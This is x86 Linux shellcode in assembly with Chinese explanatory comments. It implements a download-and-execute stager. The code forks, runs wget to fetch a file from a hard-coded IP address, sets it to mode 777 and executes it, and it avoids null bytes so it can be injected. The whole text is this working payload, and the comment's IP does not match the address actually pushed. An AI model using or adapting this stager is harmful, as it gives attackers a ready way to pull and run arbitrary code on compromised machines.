  global _start
    	section .text
    	_start:
    	;fork
    	xor eax,eax ; eax寄存器清零
    	mov al,0x2 ; x86平台32位Linux系统调用号 #define __NR_fork  2
    	int 0x80 ;启动系统调用需要使用INT指令。linux系统调用位于中断0x80，执行INT指令时，所有操作转移到内核中的系统调用处理程序，完成后执行转移到INT指令之后的下一条指令。
    	xor ebx,ebx
    	cmp eax,ebx ;ZF=0
    	jz child ;jump if zero(ZF=0)
      
    	;wait(NULL)
    	xor eax,eax ; eax寄存器清零
    	mov al,0x7 ; #define __NR_waitpid 7
    	int 0x80
    		
    	;chmod x
    	xor ecx,ecx
    	xor eax, eax
    	push eax
    	mov al, 0xf ;#define __NR_chmod 15
    	push 0x78 ; x：下载文件名
    	mov ebx, esp
    	xor ecx, ecx
    	mov cx, 0x1ff ; 0x1ff换算为8进制为777，通过按位与运算计算权限。(参数）
    	int 0x80
    	
    	;exec x
    	xor eax, eax
    	push eax
    	push 0x78 ; x：下载文件名
    	mov ebx, esp
    	push eax
    	mov edx, esp
    	push ebx
    	mov ecx, esp
    	mov al, 11 ; #define __NR_execve 11
    	int 0x80
    	
    	child:
    
    	;download 192.168.227.11//x with wget
    	push 0xb ; #define __NR_execve 11
    	pop eax
    	cdq ; 把EDX的所有位都设成EAX最高位的值
    	push edx
    	
    	push 0x782f2f32	;2//x avoid null byte
    	push 0x32322e32 ;2.22
    	push 0x2e383631 ;168.
    	push 0x2e323931 ;192.
    	mov ecx,esp ;保存堆栈指针X-16-8
    	push edx
    	
    	push 0x74 ;t
    	push 0x6567772f ;egw/
    	push 0x6e69622f ;nib/
    	push 0x7273752f ;rsu/
    	mov ebx,esp ；X-42-8
    	push edx
    
    	push ecx
    	push ebx
    	mov ecx,esp
    	int 0x80